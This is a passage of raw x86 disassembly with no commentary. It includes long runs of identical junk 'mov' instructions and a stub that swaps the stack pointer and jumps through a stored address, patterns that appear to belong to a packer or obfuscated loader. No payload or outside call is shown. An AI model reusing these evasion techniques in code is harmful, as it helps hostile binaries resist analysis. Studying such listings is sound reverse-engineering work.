  450614:	mov    eax,DWORD PTR [ebp+0x8]
  450617:	mov    esp,ebp
  450619:	pop    ebp
  45061a:	ret    
  45061b:	int3   
  45061c:	int3   
  45061d:	int3   
  45061e:	int3   
  45061f:	int3   
  450620:	push   ebp
  450621:	mov    ebp,esp
  450623:	push   ecx
  450624:	mov    DWORD PTR [ebp-0x4],0x22a7
  45062b:	mov    DWORD PTR [ebp-0x4],0x22a7
  450632:	mov    DWORD PTR [ebp-0x4],0x22a7
  450639:	mov    DWORD PTR [ebp-0x4],0x22a7
  450640:	mov    DWORD PTR [ebp-0x4],0x22a7
  450647:	mov    DWORD PTR [ebp-0x4],0x22a7
  45064e:	mov    DWORD PTR [ebp-0x4],0x22a7
  450655:	mov    DWORD PTR [ebp-0x4],0x22a7
  45065c:	mov    DWORD PTR [ebp-0x4],0x22a7
  450663:	mov    DWORD PTR [ebp-0x4],0x22a7
  45066a:	mov    DWORD PTR [ebp-0x4],0x22a7
  450671:	mov    DWORD PTR [ebp-0x4],0x22a7
  450678:	mov    DWORD PTR [ebp-0x4],0x22a7
  45067f:	mov    DWORD PTR [ebp-0x4],0x22a7
  450686:	mov    DWORD PTR [ebp-0x4],0x22a7
  45068d:	mov    DWORD PTR [ebp-0x4],0x22a7
  450694:	mov    DWORD PTR [ebp-0x4],0x22a7
  45069b:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506a2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506a9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506b0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506b7:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506be:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506c5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506cc:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506d3:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506da:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506e1:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506e8:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506ef:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506f6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4506fd:	mov    DWORD PTR [ebp-0x4],0x22a7
  450704:	mov    DWORD PTR [ebp-0x4],0x22a7
  45070b:	mov    DWORD PTR [ebp-0x4],0x22a7
  450712:	mov    DWORD PTR [ebp-0x4],0x22a7
  450719:	mov    DWORD PTR [ebp-0x4],0x22a7
  450720:	mov    DWORD PTR [ebp-0x4],0x22a7
  450727:	mov    DWORD PTR [ebp-0x4],0x22a7
  45072e:	mov    DWORD PTR [ebp-0x4],0x22a7
  450735:	mov    DWORD PTR [ebp-0x4],0x22a7
  45073c:	mov    DWORD PTR [ebp-0x4],0x22a7
  450743:	mov    DWORD PTR [ebp-0x4],0x22a7
  45074a:	mov    DWORD PTR [ebp-0x4],0x22a7
  450751:	mov    DWORD PTR [ebp-0x4],0x22a7
  450758:	mov    DWORD PTR [ebp-0x4],0x22a7
  45075f:	mov    DWORD PTR [ebp-0x4],0x22a7
  450766:	mov    DWORD PTR [ebp-0x4],0x22a7
  45076d:	mov    DWORD PTR [ebp-0x4],0x22a7
  450774:	mov    DWORD PTR [ebp-0x4],0x22a7
  45077b:	mov    DWORD PTR [ebp-0x4],0x22a7
  450782:	mov    DWORD PTR [ebp-0x4],0x22a7
  450789:	mov    DWORD PTR [ebp-0x4],0x22a7
  450790:	mov    DWORD PTR [ebp-0x4],0x22a7
  450797:	mov    DWORD PTR [ebp-0x4],0x22a7
  45079e:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507a5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507ac:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507b3:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507ba:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507c1:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507c8:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507cf:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507d6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507dd:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507e4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507eb:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507f2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4507f9:	mov    DWORD PTR [ebp-0x4],0x22a7
  450800:	mov    DWORD PTR [ebp-0x4],0x22a7
  450807:	mov    DWORD PTR [ebp-0x4],0x22a7
  45080e:	mov    DWORD PTR [ebp-0x4],0x22a7
  450815:	mov    DWORD PTR [ebp-0x4],0x22a7
  45081c:	mov    DWORD PTR [ebp-0x4],0x22a7
  450823:	mov    DWORD PTR [ebp-0x4],0x22a7
  45082a:	mov    DWORD PTR [ebp-0x4],0x22a7
  450831:	mov    DWORD PTR [ebp-0x4],0x22a7
  450838:	mov    DWORD PTR [ebp-0x4],0x22a7
  45083f:	mov    DWORD PTR [ebp-0x4],0x22a7
  450846:	mov    DWORD PTR [ebp-0x4],0x22a7
  45084d:	mov    DWORD PTR [ebp-0x4],0x22a7
  450854:	mov    DWORD PTR [ebp-0x4],0x22a7
  45085b:	mov    DWORD PTR [ebp-0x4],0x22a7
  450862:	mov    DWORD PTR [ebp-0x4],0x22a7
  450869:	mov    DWORD PTR [ebp-0x4],0x22a7
  450870:	mov    DWORD PTR [ebp-0x4],0x22a7
  450877:	mov    DWORD PTR [ebp-0x4],0x22a7
  45087e:	mov    DWORD PTR [ebp-0x4],0x22a7
  450885:	mov    DWORD PTR [ebp-0x4],0x22a7
  45088c:	mov    DWORD PTR [ebp-0x4],0x22a7
  450893:	mov    DWORD PTR [ebp-0x4],0x22a7
  45089a:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508a1:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508a8:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508af:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508b6:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508bd:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508c4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508cb:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508d2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508d9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508e0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508e7:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508ee:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508f5:	mov    DWORD PTR [ebp-0x4],0x22a7
  4508fc:	mov    DWORD PTR [ebp-0x4],0x22a7
  450903:	mov    DWORD PTR [ebp-0x4],0x22a7
  45090a:	mov    DWORD PTR [ebp-0x4],0x22a7
  450911:	mov    DWORD PTR [ebp-0x4],0x22a7
  450918:	mov    DWORD PTR [ebp-0x4],0x22a7
  45091f:	mov    DWORD PTR [ebp-0x4],0x22a7
  450926:	mov    DWORD PTR [ebp-0x4],0x22a7
  45092d:	mov    DWORD PTR [ebp-0x4],0x22a7
  450934:	mov    DWORD PTR [ebp-0x4],0x22a7
  45093b:	mov    DWORD PTR [ebp-0x4],0x22a7
  450942:	mov    DWORD PTR [ebp-0x4],0x22a7
  450949:	mov    DWORD PTR [ebp-0x4],0x22a7
  450950:	mov    DWORD PTR [ebp-0x4],0x22a7
  450957:	mov    DWORD PTR [ebp-0x4],0x22a7
  45095e:	mov    DWORD PTR [ebp-0x4],0x22a7
  450965:	mov    DWORD PTR [ebp-0x4],0x22a7
  45096c:	mov    DWORD PTR [ebp-0x4],0x22a7
  450973:	mov    DWORD PTR [ebp-0x4],0x22a7
  45097a:	mov    DWORD PTR [ebp-0x4],0x22a7
  450981:	mov    DWORD PTR [ebp-0x4],0x22a7
  450988:	mov    DWORD PTR [ebp-0x4],0x22a7
  45098f:	mov    DWORD PTR [ebp-0x4],0x22a7
  450996:	mov    DWORD PTR [ebp-0x4],0x22a7
  45099d:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509a4:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509ab:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509b2:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509b9:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509c0:	mov    DWORD PTR [ebp-0x4],0x22a7
  4509c7:	mov    eax,ds:0x456144
  4509cc:	sub    eax,0x8
  4509cf:	mov    ds:0x456144,eax
  4509d4:	mov    ecx,DWORD PTR ds:0x456144
  4509da:	mov    DWORD PTR [ebp-0x4],ecx
  4509dd:	mov    edx,DWORD PTR [ebp-0x4]
  4509e0:	shr    edx,1
  4509e2:	mov    DWORD PTR [ebp-0x4],edx
  4509e5:	mov    eax,DWORD PTR [ebp-0x4]
  4509e8:	mov    ds:0x456144,eax
  4509ed:	mov    esp,ebp
  4509ef:	pop    ebp
  4509f0:	ret    
  4509f1:	int3   
  4509f2:	int3   
  4509f3:	int3   
  4509f4:	int3   
  4509f5:	int3   
  4509f6:	int3   
  4509f7:	int3   
  4509f8:	int3   
  4509f9:	int3   
  4509fa:	int3   
  4509fb:	int3   
  4509fc:	int3   
  4509fd:	int3   
  4509fe:	int3   
  4509ff:	int3   
  450a00:	push   ebp
  450a01:	mov    ebp,esp
  450a03:	mov    edx,edx
  450a05:	mov    esp,DWORD PTR ds:0x456148
  450a0b:	mov    edx,edx
  450a0d:	add    esp,0x4
  450a10:	mov    edx,edx
  450a12:	mov    ecx,DWORD PTR ds:0x45614c
  450a18:	mov    edx,edx
  450a1a:	jmp    ecx
  450a1c:	mov    edx,edx
  450a1e:	pop    ebp
  450a1f:	ret    
  450a20:	push   ebp
  450a21:	mov    ebp,esp
  450a23:	call   0x4503e0
  450a28:	mov    eax,ds:0x456134
  450a2d:	push   eax
  450a2e:	call   0x450410
  450a33:	add    esp,0x4
  450a36:	mov    ds:0x45612c,eax
  450a3b:	pop    ebp
  450a3c:	ret    
  450a3d:	int3   
  450a3e:	int3   
  450a3f:	int3   
  450a40:	push   ebp
  450a41:	mov    ebp,esp
  450a43:	sub    esp,0x28
  450a46:	mov    DWORD PTR [ebp-0x28],0x4016a6
  450a4d:	mov    DWORD PTR [ebp-0x24],0x1027
  450a54:	mov    DWORD PTR [ebp-0x18],0x4
  450a5b:	mov    eax,DWORD PTR [ebp-0x18]
  450a5e:	mov    ecx,DWORD PTR [ebp-0x28]
  450a61:	lea    edx,[ecx+eax*1+0x29]
  450a65:	mov    DWORD PTR [ebp-0x20],edx
  450a68:	mov    eax,DWORD PTR [ebp-0x20]
  450a6b:	mov    DWORD PTR [ebp-0x1c],eax
  450a6e:	mov    DWORD PTR [ebp-0x14],0x0
  450a75:	lea    ecx,[ebp-0x14]
  450a78:	push   ecx
  450a79:	push   0x0
  450a7b:	call   DWORD PTR ds:0x455464
  450a81:	cmp    DWORD PTR [ebp-0x14],0x0
  450a85:	jne    0x450a8b
  450a87:	xor    eax,eax
  450a89:	jmp    0x450a97
  450a8b:	mov    edx,DWORD PTR [ebp-0x1c]
  450a8e:	sub    edx,0x29
  450a91:	mov    DWORD PTR ds:0x456134,edx
  450a97:	mov    esp,ebp
  450a99:	pop    ebp
  450a9a:	ret    
  450a9b:	int3   
  450a9c:	int3   
  450a9d:	int3   
  450a9e:	int3   
  450a9f:	int3   
  450aa0:	push   ebp
  450aa1:	mov    ebp,esp
  450aa3:	sub    esp,0xc
  450aa6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450aad:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ab4:	mov    DWORD PTR [ebp-0xc],0x1024a
  450abb:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ac2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ac9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ad0:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ad7:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ade:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ae5:	mov    DWORD PTR [ebp-0xc],0x1024a
  450aec:	mov    DWORD PTR [ebp-0xc],0x1024a
  450af3:	mov    DWORD PTR [ebp-0xc],0x1024a
  450afa:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b01:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b08:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b0f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b16:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b1d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b24:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b2b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b32:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b39:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b40:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b47:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b4e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b55:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b5c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b63:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b6a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b71:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b78:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b7f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b86:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b8d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b94:	mov    DWORD PTR [ebp-0xc],0x1024a
  450b9b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ba2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ba9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bb0:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bb7:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bbe:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bc5:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bcc:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bd3:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bda:	mov    DWORD PTR [ebp-0xc],0x1024a
  450be1:	mov    DWORD PTR [ebp-0xc],0x1024a
  450be8:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bef:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bf6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450bfd:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c04:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c0b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c12:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c19:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c20:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c27:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c2e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c35:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c3c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c43:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c4a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c51:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c58:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c5f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c66:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c6d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c74:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c7b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c82:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c89:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c90:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c97:	mov    DWORD PTR [ebp-0xc],0x1024a
  450c9e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ca5:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cac:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cb3:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cba:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cc1:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cc8:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ccf:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cd6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cdd:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ce4:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ceb:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cf2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450cf9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d00:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d07:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d0e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d15:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d1c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d23:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d2a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d31:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d38:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d3f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d46:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d4d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d54:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d5b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d62:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d69:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d70:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d77:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d7e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d85:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d8c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d93:	mov    DWORD PTR [ebp-0xc],0x1024a
  450d9a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450da1:	mov    DWORD PTR [ebp-0xc],0x1024a
  450da8:	mov    DWORD PTR [ebp-0xc],0x1024a
  450daf:	mov    DWORD PTR [ebp-0xc],0x1024a
  450db6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dbd:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dc4:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dcb:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dd2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dd9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450de0:	mov    DWORD PTR [ebp-0xc],0x1024a
  450de7:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dee:	mov    DWORD PTR [ebp-0xc],0x1024a
  450df5:	mov    DWORD PTR [ebp-0xc],0x1024a
  450dfc:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e03:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e0a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e11:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e18:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e1f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e26:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e2d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e34:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e3b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e42:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e49:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e50:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e57:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e5e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e65:	mov    eax,DWORD PTR [ebp+0x8]
  450e68:	cmp    DWORD PTR [eax+0x4],0x0
  450e6c:	je     0x451269
  450e72:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e79:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e80:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e87:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e8e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e95:	mov    DWORD PTR [ebp-0xc],0x1024a
  450e9c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ea3:	mov    DWORD PTR [ebp-0xc],0x1024a
  450eaa:	mov    DWORD PTR [ebp-0xc],0x1024a
  450eb1:	mov    DWORD PTR [ebp-0xc],0x1024a
  450eb8:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ebf:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ec6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ecd:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ed4:	mov    DWORD PTR [ebp-0xc],0x1024a
  450edb:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ee2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ee9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ef0:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ef7:	mov    DWORD PTR [ebp-0xc],0x1024a
  450efe:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f05:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f0c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f13:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f1a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f21:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f28:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f2f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f36:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f3d:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f44:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f4b:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f52:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f59:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f60:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f67:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f6e:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f75:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f7c:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f83:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f8a:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f91:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f98:	mov    DWORD PTR [ebp-0xc],0x1024a
  450f9f:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fa6:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fad:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fb4:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fbb:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fc2:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fc9:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fd0:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fd7:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fde:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fe5:	mov    DWORD PTR [ebp-0xc],0x1024a
  450fec:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ff3:	mov    DWORD PTR [ebp-0xc],0x1024a
  450ffa:	mov    DWORD PTR [ebp-0xc],0x1024a
  451001:	mov    DWORD PTR [ebp-0xc],0x1024a
  451008:	mov    DWORD PTR [ebp-0xc],0x1024a
  45100f:	mov    DWORD PTR [ebp-0xc],0x1024a
  451016:	mov    DWORD PTR [ebp-0xc],0x1024a
  45101d:	mov    DWORD PTR [ebp-0xc],0x1024a
  451024:	mov    DWORD PTR [ebp-0xc],0x1024a
  45102b:	mov    DWORD PTR [ebp-0xc],0x1024a
  451032:	mov    DWORD PTR [ebp-0xc],0x1024a
  451039:	mov    DWORD PTR [ebp-0xc],0x1024a
  451040:	mov    DWORD PTR [ebp-0xc],0x1024a
  451047:	mov    DWORD PTR [ebp-0xc],0x1024a
  45104e:	mov    DWORD PTR [ebp-0xc],0x1024a
  451055:	mov    DWORD PTR [ebp-0xc],0x1024a
  45105c:	mov    DWORD PTR [ebp-0xc],0x1024a
  451063:	mov    DWORD PTR [ebp-0xc],0x1024a
  45106a:	mov    DWORD PTR [ebp-0xc],0x1024a
  451071:	mov    DWORD PTR [ebp-0xc],0x1024a
  451078:	mov    DWORD PTR [ebp-0xc],0x1024a
  45107f:	mov    DWORD PTR [ebp-0xc],0x1024a
  451086:	mov    DWORD PTR [ebp-0xc],0x1024a
  45108d:	mov    DWORD PTR [ebp-0xc],0x1024a
  451094:	mov    DWORD PTR [ebp-0xc],0x1024a
  45109b:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510a2:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510a9:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510b0:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510b7:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510be:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510c5:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510cc:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510d3:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510da:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510e1:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510e8:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510ef:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510f6:	mov    DWORD PTR [ebp-0xc],0x1024a
  4510fd:	mov    DWORD PTR [ebp-0xc],0x1024a
  451104:	mov    DWORD PTR [ebp-0xc],0x1024a
  45110b:	mov    DWORD PTR [ebp-0xc],0x1024a
  451112:	mov    DWORD PTR [ebp-0xc],0x1024a
  451119:	mov    DWORD PTR [ebp-0xc],0x1024a
  451120:	mov    DWORD PTR [ebp-0xc],0x1024a
  451127:	mov    DWORD PTR [ebp-0xc],0x1024a
  45112e:	mov    DWORD PTR [ebp-0xc],0x1024a
  451135:	mov    DWORD PTR [ebp-0xc],0x1024a
  45113c:	mov    DWORD PTR [ebp-0xc],0x1024a
  451143:	mov    DWORD PTR [ebp-0xc],0x1024a
  45114a:	mov    DWORD PTR [ebp-0xc],0x1024a
  451151:	mov    DWORD PTR [ebp-0xc],0x1024a
  451158:	mov    DWORD PTR [ebp-0xc],0x1024a
  45115f:	mov    DWORD PTR [ebp-0xc],0x1024a
  451166:	mov    DWORD PTR [ebp-0xc],0x1024a
  45116d:	mov    DWORD PTR [ebp-0xc],0x1024a
  451174:	mov    DWORD PTR [ebp-0xc],0x1024a
  45117b:	mov    DWORD PTR [ebp-0xc],0x1024a
  451182:	mov    DWORD PTR [ebp-0xc],0x1024a
  451189:	mov    DWORD PTR [ebp-0xc],0x1024a
  451190:	mov    DWORD PTR [ebp-0xc],0x1024a
  451197:	mov    DWORD PTR [ebp-0xc],0x1024a
  45119e:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511a5:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511ac:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511b3:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511ba:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511c1:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511c8:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511cf:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511d6:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511dd:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511e4:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511eb:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511f2:	mov    DWORD PTR [ebp-0xc],0x1024a
  4511f9:	mov    DWORD PTR [ebp-0xc],0x1024a
  451200:	mov    DWORD PTR [ebp-0xc],0x1024a
  451207:	mov    DWORD PTR [ebp-0xc],0x1024a
  45120e:	mov    DWORD PTR [ebp-0xc],0x1024a
  451215:	mov    DWORD PTR [ebp-0xc],0x1024a
  45121c:	mov    DWORD PTR [ebp-0xc],0x1024a
  451223:	mov    DWORD PTR [ebp-0xc],0x1024a
  45122a:	mov    ecx,DWORD PTR [ebp+0x8]
  45122d:	add    ecx,0x8
  451230:	mov    DWORD PTR ds:0x456150,ecx
  451236:	mov    edx,DWORD PTR [ebp+0x8]
  451239:	mov    eax,DWORD PTR [edx+0x4]
  45123c:	mov    ds:0x456144,eax
  451241:	call   0x450620
  451246:	mov    ecx,DWORD PTR [ebp+0x8]
  451249:	mov    DWORD PTR ds:0x456140,ecx
  45124f:	mov    edx,DWORD PTR [ebp+0x10]
  451252:	push   edx
  451253:	mov    eax,DWORD PTR [ebp+0xc]
  451256:	push   eax
  451257:	push   0x1
  451259:	call   0x4504c0
  45125e:	add    esp,0xc
  451261:	mov    DWORD PTR [ebp+0x8],eax
  451264:	jmp    0x450e65
  451269:	mov    esp,ebp
  45126b:	pop    ebp
  45126c:	ret    
  45126d:	int3   
  45126e:	int3   
  45126f:	int3   
  451270:	push   ebp
  451271:	mov    ebp,esp
  451273:	sub    esp,0x7c
  451276:	push   ebx
  451277:	push   esi
  451278:	push   edi
  451279:	mov    DWORD PTR [ebp-0x28],0x450a00
